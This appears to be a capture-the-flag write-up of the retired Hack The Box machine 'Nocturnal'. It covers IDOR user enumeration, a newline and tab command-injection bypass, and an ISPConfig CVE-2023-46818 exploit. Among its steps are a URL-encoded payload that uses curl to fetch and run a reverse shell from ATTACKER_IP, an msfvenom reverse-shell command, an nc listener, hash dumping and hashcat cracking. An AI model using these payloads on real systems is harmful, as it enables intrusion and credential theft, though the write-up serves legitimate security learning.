---
title: "😴 HTB Nocturnal Write-up"
name: Nocturnal
date: 2025-08-16
difficulty: Easy
os: Linux
skills: "Enumeration, IDOR, Web Fuzzing, Sensitive Information Disclosure, Code Analysis, Command Injection, Reverse Shell, Database Looting, Password Cracking, SSH Local Port Forwarding"
tools: "rustscan, nmap, ffuf, msfvenom, CyberChef, Burp Suite, nc, sqlite3, hashcat, ssh, CVE-2023-46818" 
published: true
---

![](images/Pasted%20image%2020250707193211.png)

## 💤 Summary

Nocturnal starts off slow and quiet — just SSH and HTTP on the radar. 

But behind the sleepy facade lies a custom file-sharing platform full of secrets and bad decisions. I abused a classic Insecure Direct Object Reference (IDOR) to enumerate users, then struck gold when one of them uploaded a sensitive document containing her credentials. 

From there, an "admin" backup feature was hiding a code injection vulnerability due to incomplete sanitization. This granted me a foothold as `www-data`. 

Digging into the SQLite database, I cracked user hashes and pivoted to Tobias via SSH. Finally, an outdated local-only ISPConfig instance vulnerable to CVE-2023-46818 delivered that sweet `root.txt` flag. 

And with that, **Nocturnal has been put to sleep.** 😴🐚

## 🕸️ Web Application Analysis

### 🔎 Recon 

**Initial scan** revealed only two ports open:
- `22/tcp`: OpenSSH 8.2
- `80/tcp`: nginx 1.18.0

```
fcoomans@kali:~/htb/nocturnal$ rustscan -a 10.10.11.64 --tries 5 --ulimit 10000 -- -sCV -oA nocturnal_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.64:22
Open 10.10.11.64:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA nocturnal_tcp_all" on ip 10.10.11.64
Depending on the complexity of the script, results may take some time to appear.

<SNIP>

Nmap scan report for nocturnal.htb (10.10.11.64)
Host is up, received reset ttl 63 (0.17s latency).
Scanned at 2025-07-07 19:19:21 SAST for 12s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpf3JJv7Vr55+A/O4p/l+TRCtst7lttqsZHEA42U5Edkqx/Kb8c+F0A4wMCVOMqwyR/PaMdmzAomYGvNYhi3NelwIEqdKKnL+5svrsStqb9XjyShPD9SQK5Su7xBt+/TfJyJFRcsl7ZJdfc6xnNHQITvwa6uZhLsicycj0yf1Mwdzy9hsc8KRY2fhzARBaPUFdG0xte2MkaGXCBuI0tMHsqJpkeZ46MQJbH5oh4zqg2J8KW+m1suAC5toA9kaLgRis8p/wSiLYtsfYyLkOt2U+E+FZs4i3vhVxb9Sjl9QuuhKaGKQN2aKc8ItrK8dxpUbXfHr1Y48HtUejBj+AleMrUMBXQtjzWheSe/dKeZyq8EuCAzeEKdKs4C7ZJITVxEe8toy7jRmBrsDe4oYcQU2J76cvNZomU9VlRv/lkxO6+158WtxqHGTzvaGIZXijIWj62ZrgTS6IpdjP3Yx7KX6bCxpZQ3+jyYN1IdppOzDYRGMjhq5ybD4eI437q6CSL20=
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLcnMmaOpYYv5IoOYfwkaYqI9hP6MhgXCT9Cld1XLFLBhT+9SsJEpV6Ecv+d3A1mEOoFL4sbJlvrt2v5VoHcf4M=
|   256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIASsDOOb+I4J4vIK5Kz0oHmXjwRJMHNJjXKXKsW0z/dy
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Welcome to Nocturnal
| http-methods:
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

<SNIP>
```

After pointing `nocturnal.htb` in `/etc/hosts`,

```
fcoomans@kali:~/htb/nocturnal$ grep nocturnal.htb /etc/hosts
10.10.11.64     nocturnal.htb
```

I open the site and find a file sharing website.

![](images/Pasted%20image%2020250708063809.png)

Obviously I register a new account to see what the application functions are.

![](images/Pasted%20image%2020250708063849.png)

The system only allows files with certain extensions to be uploaded.  I create a fake Word Document file.

```
fcoomans@kali:~/htb/nocturnal$ echo -n 'Hello World!' >test.doc
```

And upload it to the application.

![](images/Pasted%20image%2020250708063950.png)

I notice the `view.php` URL when hovering over the uploaded file.

![](images/Pasted%20image%2020250708064053.png)

I copy and paste the URL and change the `username` to `userdoesntexist` and the server simply responds with `User not found`.
That's interesting and can be used to discover valid users.

![](images/Pasted%20image%2020250708064233.png)

Even more interesting is if I enter a valid username and change the `file` parameter to `filedoesntexist.doc`, then the application responds with `File does not exist`, but displays all files uploaded by the valid user.
This is clearly an indirect object reference (IDOR) vulnerability.

![](images/Pasted%20image%2020250708064142.png)

My session cookie is copied by opening the browser's Developer Tools (F12) and copying the `PHPSESSID` cookie.
`curl` is used to get the file size of the response when an incorrect user request is sent.

```
fcoomans@kali:~/htb/nocturnal$ curl -H "Cookie: PHPSESSID=8nadas6s31f6q907t49vn567fu" -s 'http://nocturnal.htb/view.php?username=userdoesntexist&file=filedoesntexist.doc' |wc -c
2985
```

This value is then plugged into `ffuf` to exclude responses for users that don't exist.
I fuzz the `username` parameter and get hits on users `admin`, `amanda` and `tobias`.

```
fcoomans@kali:~/htb/nocturnal$ ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ -H "Cookie: PHPSESSID=8nadas6s31f6q907t49vn567fu" -u 'http://nocturnal.htb/view.php?username=FUZZ&file=test2d.doc' -ic -t 60 -fs 2985

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=test2d.doc
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Cookie: PHPSESSID=8nadas6s31f6q907t49vn567fu
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2985
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 188ms]
amanda                  [Status: 200, Size: 3295, Words: 1177, Lines: 129, Duration: 182ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 188ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

### 🧪 Exploitation

I access http://nocturnal.htb/view.php?username=amanda&file=filedoesntexist.doc to access Amanda's uploaded files.
The `privacy.odt` file is downloaded.

![](images/Pasted%20image%2020250708064519.png)

And opened with LibreOffice.  It contains Amanda's "temporary password" to access the system.
Amanda possibly never changed this password and worst of all uploaded this document containing extremely sensitive information to the file share.  Ouch!

![](images/Pasted%20image%2020250708064807.png)

Amanda didn't change the "temporary password" and `arHkG7HAI68X8s1J` is used to access her Dashboard.
The Dashboard contains an `Admin Panel` link.

![](images/Pasted%20image%2020250708064919.png)

Opening the admin panel shows two sections:  
- The top section allows the Administrator to view the source code for the application.
- The bottom section allows the Administrator to perform a backup.
Let's see how the backup works, by viewing the `admin.php` source code.

![](images/Pasted%20image%2020250708065011.png)

Lines 211-232 show what happens when a backup is performed.  Line 221 shows that the password is simply concatenated to the `zip` command and that command is simply executed on line 229.
This code is vulnerable to code injection, but line 213 shows that the `cleanEntry()` function tries to sanitize or validate the entered `password`.

```php
   211  <?php
   212  if (isset($_POST['backup']) && !empty($_POST['password'])) {
   213      $password = cleanEntry($_POST['password']);
   214      $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";
   215
   216      if ($password === false) {
   217          echo "<div class='error-message'>Error: Try another password.</div>";
   218      } else {
   219          $logFile = '/tmp/backup_' . uniqid() . '.log';
   220
   221          $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
   222
   223          $descriptor_spec = [
   224              0 => ["pipe", "r"], // stdin
   225              1 => ["file", $logFile, "w"], // stdout
   226              2 => ["file", $logFile, "w"], // stderr
   227          ];
   228
   229          $process = proc_open($command, $descriptor_spec, $pipes);
   230          if (is_resource($process)) {
   231              proc_close($process);
   232          }
```

Lines 44-54 show the `cleanEntry()` function with a blacklist to reject common command injection characters.
The problem is that they didn't exclude newline (`%0a`) which can be used to break out of the command, and tab (`%09`), which can be used instead of spaces.  
Newlines let me break out of the original command, and tabs replace filtered-out spaces to preserve shell syntax. Double-ouch!

```php
    44  function cleanEntry($entry) {
    45      $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];
    46
    47      foreach ($blacklist_chars as $char) {
    48          if (strpos($entry, $char) !== false) {
    49              return false; // Malicious input detected
    50          }
    51      }
    52
    53      return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
    54  }
```

I use `msfvenom` to create a Linux reverse shell.

```
fcoomans@kali:~/htb/nocturnal$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 EXITFUNC=thread -f elf -o www/revshell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: www/revshell

fcoomans@kali:~/htb/nocturnal$ python -m http.server -d www
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And then serve the reverse shell with a Python web server.

```
fcoomans@kali:~/htb/nocturnal$ python -m http.server -d www
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

A `nc` listener is also started on the attack host.

```
fcoomans@kali:~/htb/nocturnal$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
```

I then use CyberChef (https://gchq.github.io/CyberChef/) to prepare the command injection payload.
`URL Encode` is selected as the conversion recipe, and all special characters should be URL encoded.  The newline character is changed to `LF` to ensure that a newline is encoded as `%0a`.
Spaces are also replaced with tabs.
This command injection payload:

```

rm	/tmp/revshell
curl	-s	http://ATTACKER_IP:8000/revshell	-o	/tmp/revshell
chmod	+x	/tmp/revshell
/tmp/revshell

```

is URL encoded to this:

```
%0Arm%09%2Ftmp%2Frevshell%0Acurl%09%2Ds%09http%3A%2F%2FATTACKER_IP%3A8000%2Frevshell%09%2Do%09%2Ftmp%2Frevshell%0Achmod%09%2Bx%09%2Ftmp%2Frevshell%0A%2Ftmp%2Frevshell%0A
```

![](images/Pasted%20image%2020250708065625.png)

I run a backup and capture the request with BURP.  The BURP repeater is then used to send the URL-encoded command injection payload to the server in the `password` parameter.

![](images/Pasted%20image%2020250708070243.png)

#### 👣 Foothold as www-data

The `nc` listener catches the reverse shell.

```
fcoomans@kali:~/htb/nocturnal$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.11.64] 35622
python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@nocturnal:/var/www/nocturnal.htb$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 💰 Post Exploitation

The user profile was saved to some form of database, and looking at `register.php` confirms this and shows that an SQLite3 database is used.

```
www-data@nocturnal:/var/www/nocturnal.htb$ cat register.php
cat register.php
<?php
session_start();
$db = new SQLite3('../nocturnal_database/nocturnal_database.db');

<SNIP>
```

I already have an interactive `pty` since I ran `python3 -c "import pty;pty.spawn('/bin/bash')"` immediately after the reverse shell was caught.
`sqlite3` is used interactively to interrogate the SQLite database, revealing MD5 password hashes in the `users` table.

```
www-data@nocturnal:/var/www/nocturnal.htb$ sqlite3 ../nocturnal_database/nocturnal_database.db
<sqlite3 ../nocturnal_database/nocturnal_database.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
.tables
uploads  users
sqlite> .schema users
.schema users
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL
);
sqlite> select * from users;
select * from users;
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
6|kavi|f38cde1654b39fea2bd4f72f1ae4cdda
7|e0Al5|101ad4543a96a7fd84908fd0d802e7db
8|fcoomans|1a1dc91c907325c69271ddf0c944bc72
sqlite> .exit
.exit
```

Tobias' MD5 password hash is cracked in seconds using `hashcat`.  His password is `slowmotionapocalypse`.

```
fcoomans@kali:~/htb/nocturnal$ hashcat -m 0 55c82b1ccd55ab219b3b109b07d5061d /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 55c82b1ccd55ab219b3b109b07d5061d

<SNIP>

```

#### 🔼 Priv Esc as Tobias

SSHed as Tobias with password `slowmotionapocalypse` and I'm in.

```
fcoomans@kali:~/htb/nocturnal$ ssh tobias@nocturnal.htb
tobias@nocturnal.htb's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-212-generic x86_64)

<SNIP>

tobias@nocturnal:~$ id
uid=1000(tobias) gid=1000(tobias) groups=1000(tobias)
```

#### 🚩 user.txt

Tobias holds the `user.txt` flag.

```
tobias@nocturnal:~$ cat user.txt
610c6c2737d0ee920484a82d38cf1874
```

## 🛠️ ISPConfig
### 🔎 Recon 

`netstat -tlpn` shows that a couple of services are running exclusively on localhost.  `8080` looks interesting.

```
tobias@nocturnal:~$ netstat -tlpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -
tcp        5      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

An SSL local port forwarding of port 8080 to 8081 (as BURP is already running on 8080),

```
fcoomans@kali:~/htb/nocturnal$ ssh -L 127.0.0.1:8081:127.0.0.1:8080 tobias@nocturnal.htb
tobias@nocturnal.htb's password:
```

Reveals an ISPConfig web application.
I re-use Tobias's password to log into http://localhost:8081 with user `admin` and password `slowmotionapocalypse`.
Digging around under `Help` -> `Version` shows that the application is ISPConfig Version: 3.2.10p1

![](images/Pasted%20image%2020250708070736.png)

### 🧪 Exploitation

#### 🐞 CVE-2023-46818

There is a known Remote Command Execution (RCE) vulnerability in this version, tagged as CVE-2023-46818.
I find a proof of concept (PoC) at https://github.com/ajdumanhug/CVE-2023-46818 and clone the repo.

```
fcoomans@kali:~/htb/nocturnal$ git clone https://github.com/ajdumanhug/CVE-2023-46818.git
Cloning into 'CVE-2023-46818'...
remote: Enumerating objects: 21, done.
remote: Counting objects: 100% (21/21), done.
remote: Compressing objects: 100% (19/19), done.
remote: Total 21 (delta 4), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (21/21), 8.57 KiB | 2.14 MiB/s, done.
Resolving deltas: 100% (4/4), done.
```

#### 🔼 Priv Esc to root

I run the exploit and immediately get root access.

```
fcoomans@kali:~/htb/nocturnal/CVE-2023-46818$ python CVE-2023-46818.py http://localhost:8081/ admin slowmotionapocalypse
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Login successful!
[+] Fetching CSRF tokens...
[+] CSRF ID: language_edit_085ae76f5b80f1662272805c
[+] CSRF Key: 7497cef63a279fe5309884d0e091b0626103793b
[+] Injecting shell payload...
[+] Shell written to: http://localhost:8081/admin/sh.php
[+] Launching shell...

ispconfig-shell# id
uid=0(root) gid=0(root) groups=0(root)

ispconfig-shell# hostname
nocturnal
```

### 💰 Post Exploitation

#### 🏆 root.txt flag

`root` is the holder of the `root.txt` flag.

```
ispconfig-shell# cat /root/root.txt
11a00a0f10c8562d8092adb998386063
```

They were asleep on security. I slipped in and stole root. 🦝

And `Planning has been Pwned!` 🎉

![](images/Pasted%20image%2020250708071110.png)

## 📚 Lessons Learned

- **IDOR can be just as deadly as RCE**: 
	Misusing error messages and file listings revealed a treasure trove of valid usernames and private files.
- **Security hygiene matters**: 
	Amanda left sensitive credentials in an uploaded file — a mistake that cost user-level access.
- **Database loot is real**: 
	Cracking MD5 hashes from the SQLite database was trivial with modern tools.
- **Local-only doesn’t mean safe**: 
	ISPConfig was only exposed on localhost, but SSH port forwarding made exploitation trivial.
- **Patch your systems**: 
	CVE-2023-46818 is a textbook example of why patch management matters, even for “internal” tools.

## ⚠️ Disclaimer

This write-up covers a retired HTB machine and is for educational purposes only. All IPs, credentials, and flags exist in a lab environment. My username matches my GitHub handle and is intentionally used to build my cybersecurity brand.
